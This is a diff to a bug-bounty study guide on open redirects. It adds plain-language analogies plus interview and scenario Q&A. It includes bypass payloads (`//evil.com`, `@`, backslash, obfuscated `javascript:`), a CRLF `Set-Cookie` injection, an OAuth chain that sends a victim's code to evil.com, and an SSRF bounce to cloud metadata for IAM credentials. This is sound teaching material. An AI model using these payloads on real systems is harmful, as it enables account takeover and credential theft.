@@ -1,5 +1,7 @@
 # Open Redirect — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)
 
+**Author:** x8bitranjit
+
 > A complete, in-depth study + field reference for **Open Redirect (Unvalidated Redirects & Forwards)** — from "what
 > is a redirect" to the chains that actually pay: **OAuth/SSO `code`/`token` theft → account takeover**, **`javascript:`
 > in a client sink → DOM-XSS**, **redirect-on-allowed-host → SSRF allow-list bypass**, **CRLF/response splitting**, and
@@ -31,6 +33,8 @@
 - **Cheat sheets** (Q91–Q95)
 - **Real-world patterns & references** (Q96–Q98)
 - **Defense — secure redirects** (Q99–Q102)
+- **Level 5 — Interview questions** (Q103–Q114)
+- **Level 6 — Scenario-based questions** (Q115–Q122)
 
 ---
 
@@ -38,6 +42,8 @@
 
 ### Q1. What is an open redirect in one breath?
 The app takes a **URL/host/path from the client** and uses it to send the browser somewhere — an HTTP `Location` header, an HTML `<meta refresh>`, or a JavaScript `location =` — without restricting the destination to its own origin. So an attacker chooses where a `target.com` link lands the victim.
+
+> *Plain version:* it's the **hotel concierge who'll walk any guest to whatever address is written on their card.** The app was told "send the browser to wherever this parameter says," and nobody checked that "wherever" has to stay on the property. So a link that clearly begins with the real `target.com` can dump the victim on a site *you* picked.
 
 ### Q2. Why is it in the same family as SSRF and OAuth `redirect_uri` bugs?
 All three are "trusting a client-controlled URL." The difference is **who follows it**: in an **open redirect the *browser* follows** it; in **SSRF the *server* fetches** it; the **OAuth `redirect_uri`** bug is a redirect that *is* validated but validated wrongly. Knowing which one you have decides the exploit and the severity.
@@ -51,20 +57,28 @@ A query param — `next`, `returnUrl`, `redirect`, `redirect_uri`, `url`, `dest`
 ### Q5. Is a bare open redirect High severity?
 No. On its own it's **Low–Medium** — a phishing enabler. It becomes **High–Critical** only when something rides along (an OAuth `code`/`token`, a reset/session token) or a control gives way (SSRF allow-list, WAF host check, `javascript:` scheme → XSS). Report the chain, not the hop.
 
+> *Plain version:* the concierge walking a guest off the property is, by itself, boring — the guest asked to leave. It only becomes a *real* bug when the guest was **carrying the master key** (a login token → account takeover), was told to **run an errand** (`javascript:` → XSS), or got **waved past a guard** (an allow-list → SSRF). No key, no errand, no guard? Then all you've got is "I can make a trusted link end somewhere shady" = phishing-grade Low/Medium. Chasing the escalation is the whole job.
+
 ### Q6. So why does the class matter at all if bare = Low?
 Because it's the **detonator** for the expensive bugs. The reason `redirect_uri` validation exists in OAuth is that a redirect you control delivers the victim's token to you. An open redirect on an SSRF-allow-listed host walks straight to cloud metadata. A `javascript:` redirect sink is XSS. It's a small bug that unlocks big ones.
 
 ### Q7. What's the single most common winning payload?
 Protocol-relative: **`//evil.example`**. A validator that only checks "does it start with `/`?" sees a path; the browser sees `//` as a scheme-relative **host** and navigates off-origin. Try it immediately after a plain absolute URL fails.
 
+> *Plain version:* the `//` trick is pure "the bouncer and the browser read the card differently." To a lazy check, `//evil.example` **starts with a slash**, so it looks like an internal path ("still on our property, fine"). But the browser reads a leading `//` as "here comes a full website address" and cheerfully sails off to `evil.example`. It's the first real bypass to try because so many apps only bother to check "does it start with `/`?".
+
 ### Q8. What are the "parser-gap trio"?
 `//` (protocol-relative), `\` (backslash — browsers treat it as `/` in the authority, many validators don't), and `@` (userinfo — everything before `@` is username, the real host is after it: `https://target.com@evil.example`). These three exploit the disagreement between what the validator parses and what the browser parses.
+
+> *Plain version:* three cards that fool the bouncer. **`//`** = "looks like a path to you, looks like a host to the browser." **`\`** = browsers secretly turn backslashes into slashes inside an address, but the bouncer takes them literally and shrugs. **`@`** = in `https://target.com@evil.example`, everything before the `@` is just a *username label* — the browser goes to `evil.example`, but a bouncer doing "does it start with target.com?" waves it through. Memorize these three; they crack the large majority of naive checks.
 
 ### Q9. `javascript:` in a `Location` header — does it XSS?
 No. Browsers ignore non-`http(s)` schemes in a `Location` response header. `javascript:` only executes in a **client-side** sink (`location.href = value`, anchor `href`, `window.open`). Mislabeling a `Location`-header `javascript:` as XSS is a classic false positive (guide §16).
 
 ### Q10. The server *fetches* my URL and shows me the content. Open redirect?
 No — that's **SSRF** (the server, not the browser, follows the URL). Report it as SSRF (usually higher-paying). An open redirect on an *allow-listed* host is the classic way to **bypass an SSRF allow-list** (Q60), but the fetch itself is SSRF, not open redirect.
+
+> *Plain version:* the deciding question is always **"who does the walking — the visitor's browser or the server itself?"** If the *browser* gets sent somewhere, it's an open redirect. If the *server* goes and fetches your URL and hands you back what it found (a link-preview, an "import from URL", an avatar-by-URL), that's a different, usually higher-paying bug called **SSRF** — file it as SSRF. Open redirect still has a role there: it's the trick that gets the server *waved past its own guard* (§Q51).
 
 ### Q11. What CWE do I cite?
 **CWE-601** (URL Redirection to Untrusted Site — "Open Redirect") is the anchor. Add **CWE-79** (the `javascript:`/DOM-XSS escalation), **CWE-918** (SSRF allow-list bypass), **CWE-113** (CRLF/response splitting), and **CWE-287/384** (auth/session, for the ATO chains). Lead the title with the impact, cite CWE-601 plus the escalation CWE.
@@ -119,6 +133,8 @@ A list of `(endpoint, param, sink-type)` where at least one produces an **off-or
 ### Q25. Why does every bypass come down to a "parser disagreement"?
 Because validation and the browser parse the same string. A bypass is any string the **validator reads as safe** (a path / a same-host URL) but the **browser reads as off-origin** (a foreign host). `//`, `\`, `@`, and encoding are the levers that split the two interpretations.
 
+> *Plain version:* two different people read the exact same card and reach different conclusions — the **bouncer** (the app's validation code) says "safe, that's one of ours," while the **browser** says "off we go to a stranger's site." Every payload in this class is just a card engineered so those two disagree. You're never smashing the check; you're feeding it something it and the browser will interpret two different ways.
+
 ### Q26. Walk me through why `//evil.example` works.
 The validator often checks "starts with `/`" or "is a relative path" → `//evil.example` passes (starts with `/`). But per URL spec, `//` begins an **authority** (scheme-relative), so the browser navigates to the host `evil.example`. Disagreement → bug.
 
@@ -145,6 +161,8 @@ Alternative "dot" code points the parser may fold to `.`: `。` (U+3002 ideograp
 
 ### Q34. When is a redirect param also a CRLF injection?
 When the param is reflected **into the `Location` response header** and `\r\n` (`%0d%0a`) survives un-neutralized. Then `?next=https://x/%0d%0aSet-Cookie:%20a=b` injects a header → **HTTP response splitting** (CWE-113) → session fixation, a second `Location`, or header-based cache poisoning/XSS.
+
+> *Plain version:* an HTTP response is a stack of one-line-each headers. `%0d%0a` is the invisible "press Enter" that ends a line. If your redirect value gets pasted straight into the `Location:` header and that "Enter" survives, you don't just choose the destination — you can **start a brand-new header line of your own**, like a `Set-Cookie:` that pins a session on the victim. That's a real step up from "redirect": you're now writing the server's response headers.
 
 ### Q35. How do I confirm a JS/DOM sink safely?
 In a browser with devtools/DOM Invader, trace the param into `location`/`href`/`assign`/`replace`/`window.open`. Then test `javascript:alert(document.domain)` — a benign `alert` proves script execution without exfiltrating anything.
@@ -192,6 +210,8 @@ Report the impact-led title (guide §20) but **document the bypass payload** in 
 ### Q48. How does `javascript:` in a redirect sink become DOM-XSS?
 If the client code does `location.href = params.get('url')` and you set `?url=javascript:alert(document.domain)`, the browser executes the script in the `target.com` origin → **DOM-XSS**. Now you can read `document.cookie`, call authenticated endpoints, and steal the session → hand off to the XSS kit for weaponization.
 
+> *Plain version:* the "run this errand" card. When the door is JavaScript, the browser accepts more than street addresses — the fake-address `javascript:...` means "run this code." So `?url=javascript:alert(document.domain)` doesn't send the browser anywhere; it makes *your script run on the target's page*, in the victim's logged-in session. That's XSS, a whole tier above a redirect — you can now read their cookies and act as them. (Reminder: only works in the JS door, not the `Location` header.)
+
 ### Q49. Why is DOM-XSS via redirect a tier above the redirect itself?
 Because a redirect just moves the browser; XSS **runs your code in the victim's authenticated session on the target origin** — session/token theft, CSRF-token exfil, account actions. Severity jumps from Low–Medium (redirect) to **High** (XSS → ATO).
 
@@ -210,6 +230,8 @@ As **SSRF** (that's where the impact is — internal/metadata reach). The open r
 ### Q54. Explain the OAuth "open redirect defeats strict `redirect_uri`" chain (chain B).
 The IdP enforces an exact `redirect_uri` allow-list you can't beat directly. But the allowed client host (`client.target.com`) has an open redirect. You set `redirect_uri=https://client.target.com/out?url=//evil.example`. The IdP validates `client.target.com` (allowed), sends the `code`/`token` there, and the open redirect **bounces it — with the code in the URL/fragment — to your host**. You just used an open redirect to steal the token past a strict allow-list.
 
+> *Plain version:* this is the master-key handoff, and it's beautiful. Google (the IdP) is strict — it will only *mail the victim's temporary key* to `client.target.com`, and you can't fake that address. Fine: `client.target.com` has its own concierge (an open redirect). So you tell Google "mail the key to `client.target.com/out?url=//evil.example`." Google checks the front part — `client.target.com`, on the guest list, approved — and mails the key there. Then `client.target.com`'s concierge dutifully forwards it, key and all, to *you*. The open redirect *is* the tool that defeats the strict list. That's why one on an OAuth host is never "just Low."
+
 ### Q55. Why does the `code` end up in my URL on the bounce?
 OAuth appends `?code=...` (or `#access_token=...` in implicit) to the redirect target. When that target 30x-bounces to your host preserving the query/fragment (or a JS sink reads and forwards it), the secret rides along. A fragment-preserving bounce is key for implicit-flow `access_token`.
 
@@ -224,6 +246,8 @@ Reset/verify tokens (a reset flow that redirects to a client-controlled URL with
 
 ### Q59. How does a `Referer` leak work?
 If a page holds a secret in its own URL (e.g. `/reset?token=abc`) and then links/redirects to your host, the browser sends `Referer: https://target.com/reset?token=abc` to you — unless a strict `Referrer-Policy` blocks it. You read the token from your logs → ATO. Check the site's `Referrer-Policy` (absent/`unsafe-url` = leak).
+
+> *Plain version:* browsers gossip. When they follow a link off a page, they usually whisper to the new site "hey, I came from *this exact URL*" — that's the `Referer` header. If the page you were on was `target.com/reset?token=SECRET`, the browser hands your server that whole address, **secret and all**, for free. The only thing that shuts the browser up is a strict `Referrer-Policy`. So a redirect off a secret-bearing page can leak the secret even without the token being in the redirect target itself.
 
 ### Q60. If there's no token and no SSRF, is it worthless?
 No — it's a **phishing** finding (Medium, context-dependent): a genuine `target.com` link that auto-redirects to your look-alike has high click-through and evades URL-reputation filters (the first hop is a trusted domain). Report it honestly as Medium with a realistic credential-theft narrative; don't inflate to Critical.
@@ -384,6 +408,8 @@ PortSwigger *DOM-based open redirection* and *OAuth* labs; OWASP *Unvalidated Re
 ### Q99. What's the single best fix?
 Don't build redirects from client input at all — use a **server-side map**: the client sends a short opaque key (`?next=42`), the server looks up the known-good URL. No user URL ever reaches the redirect → the class is eliminated.
 
+> *Plain version:* stop letting guests write the address on the card at all. Instead, hand them a **numbered token** — the guest says "take me to destination #42," and the concierge looks up what #42 actually means from a list only staff control. Since the guest never gets to write a real address, there's no card to forge, and the entire bug class disappears. Every other "fix" is just a better bouncer; this one removes the card.
+
 ### Q100. If I must accept a user-supplied target, how do I validate it?
 Enforce it's a **relative path**: reject anything containing a scheme, `//`, `\`, `@`, or a host. Better, **parse** the URL and compare the **parsed host** against an exact allow-list (never a substring/`startsWith` check), after canonicalization. Reject non-`http(s)` schemes outright.
 
@@ -392,6 +418,78 @@ Deny `javascript:`/`data:` in client sinks (validate scheme before assigning to 
 
 ### Q102. What's the residual risk after fixing the redirect param?
 Subdomain takeovers (a controlled `*.target.com` becomes a "whitelisted" redirect — cross-ref that kit), open redirects on partner/vendor hosts still in an allow-list, and DOM redirects in third-party JS. Redirect hygiene is app-wide, not per-param — audit every sink and keep the allow-list of external hosts minimal and exact.
+
+---
+
+# LEVEL 5 — INTERVIEW QUESTIONS (Q103–Q114)
+
+> *The questions a senior interviewer or triage lead actually asks. Say the crisp version out loud; each layers plain → mechanism → practical.*
+
+### Q103. Explain open redirect — and why it's usually rated Low — to a non-technical person.
+A web app takes a "where to go next" address from the URL (like `?next=/dashboard`) and sends your browser there. If it doesn't check that address, an attacker can put *their* site in it, so a link that starts with the trusted domain quietly forwards you to a fake login page — useful for phishing. It's rated Low **on its own** because it's "just" a redirect; the whole skill is proving it's the *entry point* to something bigger.
+
+### Q104. So if it's Low, why do experienced hunters chase it?
+Because a bare redirect is a **detonator**, not the payload. The same `?next=` becomes **DOM-XSS** if the sink is client-side JS (`location.href = next` accepts `javascript:`), **OAuth account takeover** if it sits on an auth client (the `code`/`token` rides the bounce to you), or an **SSRF allow-list bypass** if a server-side fetcher trusts the host. The redirect is Low; the chain is High-to-Critical. You never rate it until you've checked the sink.
+
+### Q105. What's the core mechanism behind every validation bypass?
+A **parse disagreement** between the app's validator and the browser. The validator decides "this string is safe/on-origin," the browser decides "this string means go to evil.com," and they read the *same bytes* differently. `//evil.com` is a path to a naive validator but a scheme-relative host to the browser; `\` is a path char to some backends but a `/` to the browser; `target.com@evil.com` looks prefixed-with-target to a `startsWith` check but has host `evil.com`. You're not breaking the check — you're feeding it an ambiguous string.
+
+### Q106. Give me the three highest-yield bypass payloads and why they work.
+`//evil.com` (**scheme-relative** — browser navigates off-site with the current scheme; beats prefix/scheme-prepend validators), `https:/\evil.com` or `/\evil.com` (**backslash** — browsers normalize `\`→`/` in the authority, many validators don't), and `https://target.com@evil.com` (**userinfo** — everything before `@` is a username, real host is `evil.com`; beats `contains`/`startsWith target.com`). The `//`, `\`, `@` trio covers most real validators.
+
+### Q107. When does an open redirect become XSS, and how do you know?
+When the redirect sink is **client-side JavaScript** — `location`, `location.href`, `location.assign()`, `location.replace()`, or `window.open()` — and you control the **start** of the assigned string. Those APIs accept a URL *scheme*, so `javascript:alert(document.domain)` executes instead of navigating. You know by reading the page's JS (does `?next=` flow into one of those sinks?) — a server `302 Location` header will *not* run `javascript:`, so this escalation is client-sink-only.
+
+### Q108. Explain the OAuth "chain B" — how an open redirect defeats a strict `redirect_uri` allow-list.
+Even when the IdP strictly only mails the `code` to `target.com` (you can't fake the host), if `target.com` itself has an open redirect, you set `redirect_uri=https://target.com/redirect?next=//evil.com`. The IdP validates the host is `target.com` (allowed) and delivers the `code` there; `target.com`'s own open redirect then bounces the browser — carrying `?code=` — to `evil.com`. The open redirect *is* the allow-list bypass. That's why an open redirect on an OAuth client host is never "just Low."
+
+### Q109. How does the same bug bypass an SSRF allow-list?
+A server-side fetcher (`/proxy?url=`, link-preview, webhook) often restricts the target to an allowed host but **follows redirects**. Point it at `https://allowed-host/redirect?next=//169.254.169.254/latest/meta-data/…`: it validates the allowed host, fetches it, follows the redirect, and lands on cloud metadata — IAM creds. The redirect launders a disallowed destination through an allowed one, server-side. Same parse/trust gap, different (server) consumer.
+
+### Q110. What turns an open redirect into CRLF/response splitting?
+When the redirect value is reflected **into the `Location` response header** and `\r\n` (`%0d%0a`) survives unfiltered. Then `?next=https://x%0d%0aSet-Cookie:%20sessionid=attacker` injects a whole new response header — a `Set-Cookie` (session fixation), a second `Location`, or a header-based cache-poisoning/XSS vector. It's a jump from "redirect" to "response header injection," a real severity bump (cross-ref Host-Header/Request-Smuggling).
+
+### Q111. How do you rate and report an open redirect honestly?
+By the **highest detonator you actually proved**, with the bare redirect as the source. Proved DOM-XSS → report XSS (High). Proved OAuth `code` theft → ATO (Critical). Proved SSRF-to-metadata → High/Critical. Proved *only* the off-origin hop → phishing enabler (Low–Medium) with an honest narrative, not an inflated "Critical." Triagers close inflated redirect reports fast; a clear chain PoC gets paid.
+
+### Q112. What's your SAFE-PoC discipline?
+Redirect to a **marker host you control** (not a real malicious site), use **your own** accounts and catch **your own** token — never harvest a real user's `code`/session. For XSS, `alert(document.domain)` then a self-cookie read to your own collector. For OAuth, run the flow with your account and show the `code` arriving at your marker host, then stop. For SSRF, hit your own OOB host or a benign internal marker. Tear down collectors afterward.
+
+### Q113. A dev says "we only allow relative paths, so we're safe." What do you test?
+Whether their "relative" check is parse-correct. Try `//evil.com` and `/\evil.com` (both *start* with `/` but are off-origin to the browser), `https:/\evil.com`, a leading `\`, `%2f%2f`, unicode/backslash variants, and a `@` after a fake path. Many "must start with `/`" checks pass `//host` because it starts with a slash. Also check the *client-side* sinks separately — a relative-path server check doesn't stop a JS sink that reads `#next=javascript:`.
+
+### Q114. Rapid-fire: (a) `Location: javascript:alert(1)` — exploitable? (b) redirect works but only same-site — useful? (c) the param is reflected in the body, not a redirect — what next?
+(a) **No** — browsers ignore `javascript:` in a `Location` header; that escalation is client-sink only. (b) Rarely as a redirect, but a **same-site** redirect can still matter for OAuth/`state` flows or reaching a sister subdomain with XSS (domain-cookie theft) — check the chain. (c) That's **reflection**, not redirect — test it for **XSS** (does it break out of the HTML/JS context?) and note it may also be an open redirect if a *different* sink consumes it.
+
+---
+
+# LEVEL 6 — SCENARIO-BASED QUESTIONS (Q115–Q122)
+
+> *You're handed a situation — decide the next move and the severity. Worked, concrete answers.*
+
+### Q115. Scenario: `?next=https://evil.com` is rejected, but `?next=//evil.com` sends the browser to evil.com. What do you have, and what's your very next step?
+A confirmed open redirect via the **scheme-relative** bypass (`//host`) — the validator saw a path, the browser saw a host. That alone is Low. The very next step is **classify the sink** (§6): read the page JS — is `next` consumed by a `302 Location` header, a `<meta refresh>`, or a client-side `location.href = next`? A JS sink means try `javascript:` for DOM-XSS; a login/OAuth context means try the `code`-theft chain; a server fetcher means try the SSRF bounce. Don't report until you've checked the detonators.
+
+### Q116. Scenario: you find `location.href = new URLSearchParams(location.search).get('next')` in the SPA's JS. Walk the exploit.
+That's a **client-side JS sink** — the jackpot. It assigns your input directly to `location.href`, which accepts a *scheme*, so fire `?next=javascript:alert(document.domain)` → script executes in the target's origin = **DOM-XSS (High)**, not a redirect. If a naive filter strips `javascript:`, bypass with `java%09script:`, `JaVaScRiPt:`, or `javascript:javascript:alert(1)`. Weaponize on your own session (read your own cookie to your own collector) to prove ATO potential, then report as XSS with the redirect as the source.
+
+### Q117. Scenario: the IdP strictly validates `redirect_uri` to `app.example.com` and you can't fake it, but `app.example.com/go?url=` is an open redirect. Exploit?
+**Chain B.** Set `redirect_uri=https://app.example.com/callback` such that the flow lands on (or you can reach) `app.example.com/go?url=//evil.com`, or directly `redirect_uri=https://app.example.com/go?url=//evil.com` if the allow-list matches on host+prefix. The IdP validates `app.example.com` (allowed) and delivers the `code` to it; the open redirect bounces the browser — with `?code=` — to `evil.com`. Redeem the code → ATO (Critical). The open redirect defeated the strict allow-list; hand the token exchange to the OAuth kit.
+
+### Q118. Scenario: a `/api/preview?url=` endpoint fetches URLs server-side but only allows `app.example.com`. You also have an open redirect on that host. Chain them.
+**SSRF allow-list bypass.** Point the preview at `https://app.example.com/redirect?next=//169.254.169.254/latest/meta-data/iam/security-credentials/`: the fetcher validates the allowed host, follows the redirect, and reaches the cloud metadata endpoint → IAM credentials (High/Critical). The open redirect launders the disallowed internal target through the allowed host, server-side. Confirm with your own OOB host first (benign), then note the metadata reach; cross-ref the SSRF kit for the exploitation discipline.
+
+### Q119. Scenario: `?next=` is reflected into the `Location:` header and your `%0d%0a` isn't stripped. What's the finding?
+**CRLF / HTTP response splitting** — a severity bump above open redirect. `?next=https://x%0d%0aSet-Cookie:%20sid=attacker%0d%0a%0d%0a` injects a `Set-Cookie` (session fixation) or a second header into the response. You can fix the victim's session, inject a cache-poisoning header, or land header-based XSS. Report the CRLF (High, depending on what you inject) — the open redirect is just the vehicle. Confirm the raw `\r\n` survives on the wire with `curl -D -`.
+
+### Q120. Scenario: the only thing you can prove is that a `target.com` link forwards to your page — no token, no XSS, no server fetch. How do you report it?
+Honestly, as a **phishing enabler (Low–Medium)** with a clear narrative: "a URL on the trusted `target.com` origin silently sends the victim to an attacker-controlled page, defeating link-trust and email/URL filters — credible credential phishing." Build the PoC on the real origin (genuine `target.com` link → your benign marker page). Do **not** inflate it to Critical, but do explain the realistic abuse (phishing, OAuth `state` laundering, filter bypass). Many programs accept this; a few mark it informational.
+
+### Q121. Scenario: validation blocks `//evil.com`, `\evil.com`, and `target.com@evil.com`. What's left in the bag?
+Go deeper into the matrix: **encoding** (`%2f%2f`, double-encoding `%252f`, `%5c` for backslash), **whitespace/control** (`https://evil.com%09`, `%00` truncation), **unicode/IDN** (`evil。com` U+3002 ideographic dot, fullwidth chars, homoglyph look-alikes), **triple-slash** (`https:///evil.com`), and **whitelist-substring** tricks (`https://evil.com/target.com`, `https://target.com.evil.com`). If the app truly parses correctly, pivot to **owning a host inside the allow-list** — a subdomain takeover of `*.target.com` gives you a *whitelisted* redirect origin (cross-ref that kit).
+
+### Q122. Scenario: you have an open redirect and the app uses it in an OAuth `state`-less flow. Beyond token theft, what else?
+A missing/loose `state` plus a redirect you influence enables **login CSRF / forced-login and OAuth `state` laundering**: you can splice your own auth response into the victim's flow, or use the redirect to move the `code`/`state` between origins to defeat weak binding. Combined with an account-linking feature, that's a **silent account takeover** (see the OAuth kit's `state` section). So test whether `state` is present, session-bound, and single-use — the redirect is what makes the `state` weakness reachable.
 
 ---
 
